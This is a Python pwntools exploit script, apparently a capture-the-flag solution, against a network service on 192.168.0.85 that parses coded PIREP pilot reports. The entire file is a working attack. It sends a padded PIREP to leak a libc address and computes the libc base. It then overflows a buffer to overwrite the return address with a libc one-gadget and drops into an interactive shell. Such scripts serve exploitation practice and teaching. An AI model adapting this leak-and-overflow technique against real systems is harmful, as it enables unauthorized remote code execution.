from pwn import *

s = remote('192.168.0.85',1234)
raw_input()
s.recvuntil('>')
s.send('5\n')
s.recvuntil('Please enter coded PIREP:')
dat = "UA /OV OKC /TM 1522 /FL "+"A"*0x10+" /TP "
dat += 'A'*(0x90-0x8-len(dat))
s.send(dat)
libc = u64(s.recvuntil('P')[-8:-2]+'\x00\x00') - 0x36e90
log.info('LIBC : 0x%x'%libc)

s.recvuntil('>')
s.send('5\n')
s.recvuntil('Please enter coded PIREP:')
dat = "UA /OV OKC /TM 1522 /FL "+"A"*0x10+" /TP "
dat += 'A'*(0x90-len(dat))
dat += 'A'*0x8
dat += p64(libc+0x4526a)
s.send(dat)

s.interactive()
